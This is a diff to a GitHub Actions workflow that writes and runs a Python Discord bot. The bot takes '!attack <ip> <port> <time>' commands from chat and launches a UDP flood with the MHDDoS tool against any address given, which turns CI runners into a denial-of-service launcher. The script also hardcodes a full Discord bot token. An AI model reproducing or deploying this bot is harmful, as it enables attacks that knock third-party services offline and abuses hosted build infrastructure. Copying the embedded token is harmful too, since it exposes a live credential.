@@ -42,63 +42,64 @@ jobs:
           python -m pip install -r requirements.txt
 
       - name: Create Bot Script
+        shell: pwsh
         run: |
-          $code = @"
-import discord
-import asyncio
-import subprocess
-import os
+          $code = @'
+          import discord
+          import asyncio
+          import subprocess
+          import os
 
-TOKEN = 'MTQzMDYyNzc2OTMxNzk4NjM4NQ.G_VIV5.otgPTwQ92MRF-gzXUhVtcT4WOLCwggjAeD0nuk'
+          TOKEN = 'MTQzMDYyNzc2OTMxNzk4NjM4NQ.G_VIV5.otgPTwQ92MRF-gzXUhVtcT4WOLCwggjAeD0nuk'
 
-intents = discord.Intents.default()
-intents.message_content = True
-client = discord.Client(intents=intents)
+          intents = discord.Intents.default()
+          intents.message_content = True
+          client = discord.Client(intents=intents)
 
-processes = []
+          processes = []
 
-@client.event
-async def on_ready():
-    print(f'Logged in as {client.user}')
+          @client.event
+          async def on_ready():
+              print(f'Logged in as {client.user}')
 
-@client.event
-async def on_message(message):
-    if message.author == client.user:
-        return
-    
-    if message.content.startswith('!attack'):
-        parts = message.content.split()
-        if len(parts) != 4:
-            await message.channel.send('Usage: !attack <ip> <port> <time>')
-            return
-        
-        ip = parts[1]
-        port = parts[2]
-        time = parts[3]
-        
-        await message.channel.send(f'Starting attack on {ip}:{port} for {time}s')
-        
-        try:
-            mhddos_path = os.path.join(os.environ['USERPROFILE'], 'MHDDoS')
-            proc = await asyncio.create_subprocess_shell(
-                f'python start.py UDP {ip}:{port} 5 {time}',
-                cwd=mhddos_path,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE
-            )
-            processes.append(proc)
-            await message.channel.send('Attack started!')
-        except Exception as e:
-            await message.channel.send(f'Error: {str(e)}')
-    
-    elif message.content == '!stop':
-        for proc in processes:
-            proc.terminate()
-        processes.clear()
-        await message.channel.send('All attacks stopped!')
+          @client.event
+          async def on_message(message):
+              if message.author == client.user:
+                  return
+              
+              if message.content.startswith('!attack'):
+                  parts = message.content.split()
+                  if len(parts) != 4:
+                      await message.channel.send('Usage: !attack <ip> <port> <time>')
+                      return
+                  
+                  ip = parts[1]
+                  port = parts[2]
+                  time = parts[3]
+                  
+                  await message.channel.send(f'Starting attack on {ip}:{port} for {time}s')
+                  
+                  try:
+                      mhddos_path = os.path.join(os.environ['USERPROFILE'], 'MHDDoS')
+                      proc = await asyncio.create_subprocess_shell(
+                          f'python start.py UDP {ip}:{port} 5 {time}',
+                          cwd=mhddos_path,
+                          stdout=asyncio.subprocess.PIPE,
+                          stderr=asyncio.subprocess.PIPE
+                      )
+                      processes.append(proc)
+                      await message.channel.send('Attack started!')
+                  except Exception as e:
+                      await message.channel.send(f'Error: {str(e)}')
+              
+              elif message.content == '!stop':
+                  for proc in processes:
+                      proc.terminate()
+                  processes.clear()
+                  await message.channel.send('All attacks stopped!')
 
-client.run(TOKEN)
-"@
+          client.run(TOKEN)
+          '@
           $code | Out-File -FilePath "$env:USERPROFILE\bot.py" -Encoding utf8
 
       - name: Start Bot
